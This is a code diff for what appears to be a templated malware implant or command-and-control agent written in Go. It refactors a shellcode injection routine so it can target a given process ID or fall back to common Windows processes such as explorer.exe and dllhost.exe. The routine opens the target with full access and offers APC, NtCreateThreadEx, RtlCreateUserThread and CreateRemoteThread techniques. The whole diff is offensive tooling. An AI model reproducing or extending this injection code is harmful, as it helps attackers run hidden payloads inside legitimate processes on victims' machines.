@@ -49,29 +49,37 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_SHELLCODE_FUNC}(shellcode []byte) st
 	return a.{AGENT_INJECT_SHELLCODE_FUNC}_with_technique(shellcode, "auto")
 }
 
-func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_SHELLCODE_FUNC}_with_technique(shellcode []byte, technique string) string {
-	// Get target process ID (try more stable processes first)
-	possibleTargets := []string{"dllhost.exe", "taskhost.exe", "conhost.exe", "notepad.exe", "explorer.exe"}
-	targetProcess := ""
-	pid := uint32(0)
-	err := fmt.Errorf("no target processes found")
+func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_SHELLCODE_FUNC}_with_technique_and_pid(shellcode []byte, technique string, pid uint32) string {
+	// If PID is provided, use it directly; otherwise find a target process
+	var targetProcess string
+	var err error
 
-	for _, target := range possibleTargets {
-		pid, err = a.{AGENT_GET_PROCESS_ID_FUNC}(target)
-		if err == nil {
-			targetProcess = target
-			break
+	if pid == 0 {
+		// No PID provided, find a target process (original behavior)
+		possibleTargets := []string{"dllhost.exe", "taskhost.exe", "conhost.exe", "notepad.exe", "explorer.exe"}
+		targetProcess = ""
+		err = fmt.Errorf("no target processes found")
+
+		for _, target := range possibleTargets {
+			pid, err = a.{AGENT_GET_PROCESS_ID_FUNC}(target)
+			if err == nil {
+				targetProcess = target
+				break
+			}
 		}
-	}
 
-	if err != nil {
-		return fmt.Sprintf("[ERROR] Could not find any suitable target process: %v", err)
+		if err != nil {
+			return fmt.Sprintf("[ERROR] Could not find any suitable target process: %v", err)
+		}
+	} else {
+		// PID provided, try to get the process name for display purposes
+		targetProcess = fmt.Sprintf("PID:%d", pid)
 	}
 
 	// Open the target process with all necessary permissions
 	processHandle := openProcess(PROCESS_ALL_ACCESS, 0, pid)
 	if processHandle == 0 {
-		return "[ERROR] Failed to open target process"
+		return fmt.Sprintf("[ERROR] Failed to open target process %s (PID: %d)", targetProcess, pid)
 	}
 	defer closeHandle(processHandle)
 
@@ -275,4 +283,9 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_SHELLCODE_FUNC}_with_technique(shell
 	default:
 		return fmt.Sprintf("[ERROR] Unknown injection technique: %s. Valid options: apc, ntcreatethread, rtlcreateuser, createremote, auto", technique)
 	}
+}
+
+func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_SHELLCODE_FUNC}_with_technique(shellcode []byte, technique string) string {
+	// Call the new function with PID 0 (original behavior)
+	return a.{AGENT_INJECT_SHELLCODE_FUNC}_with_technique_and_pid(shellcode, technique, 0)
 }
